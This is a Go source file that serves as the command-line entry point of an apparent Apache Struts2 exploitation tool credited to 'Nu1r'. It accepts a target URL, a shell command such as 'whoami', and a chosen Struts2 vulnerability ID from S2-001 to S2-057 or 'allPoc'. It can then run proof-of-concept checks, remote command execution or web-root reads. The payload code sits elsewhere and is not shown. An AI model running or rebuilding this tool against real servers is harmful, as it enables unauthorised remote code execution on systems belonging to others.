package main

import (
	"flag"
	"fmt"
	"os"
)

var (
	url     string
	command string
	Name    string
	Data    string
	Type    string
)

func usage() {
	fmt.Println(`Usage of main.exe:
  -u url
      you target, example: https://192.168.1.1
  -c command
      you want execute command, example: "whoami"
  -n name
      漏洞名，可选S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019,
		S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057,allPoc(除了s2-052)
		(单独使用POC | EXP 例: S2-001 | s2-001_Cmd | s2-001_WebPath)
  -d data
	  指定POST参数
  -t Type
      指定contentType头`)
}

func banner() {
	ban := `
███████╗████████╗██████╗ ██╗   ██╗████████╗███████╗██████╗     ██████╗  ██████╗ 
██╔════╝╚══██╔══╝██╔══██╗██║   ██║╚══██╔══╝██╔════╝╚════██╗   ██╔════╝ ██╔═══██╗
███████╗   ██║   ██████╔╝██║   ██║   ██║   ███████╗ █████╔╝   ██║  ███╗██║   ██║
╚════██║   ██║   ██╔══██╗██║   ██║   ██║   ╚════██║██╔═══╝    ██║   ██║██║   ██║
███████║   ██║   ██║  ██║╚██████╔╝   ██║   ███████║███████╗██╗╚██████╔╝╚██████╔╝
╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚══════╝╚═╝ ╚═════╝  ╚═════╝    by Nu1r`
	fmt.Println(ban)
}

func main() {
	flag.StringVar(&url, "u", "", "your target")
	flag.StringVar(&command, "c", "", "command")
	flag.StringVar(&Name, "n", "", "(单独使用POC | EXP 例: S2-001 | s2-001_Cmd | s2-001_WebPath)")
	flag.StringVar(&Data, "d", "", "POST参数")
	flag.StringVar(&Type, "t", "", "指定contentType头")
	flag.Usage = usage
	flag.Parse()
	banner()

	if url == "" || Name == "" {
		usage()
		os.Exit(0)
	}

	Exp := WorkExp{
		Url: url,     // URL
		Cmd: command, // command
		/*  POC验证, 命令执行, WEB根路径读取
		S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019,
		S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057,allPoc(除了s2-052)
		(单独使用POC | EXP 例: S2-001 | s2-001_Cmd | s2-001_WebPath)
		*/
		CveName:     Name,
		postData:    Data, // POST | GET参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp}
		contentType: Type, // 例: application/x-www-form-urlencoded
	}
	Exp.Run()
}
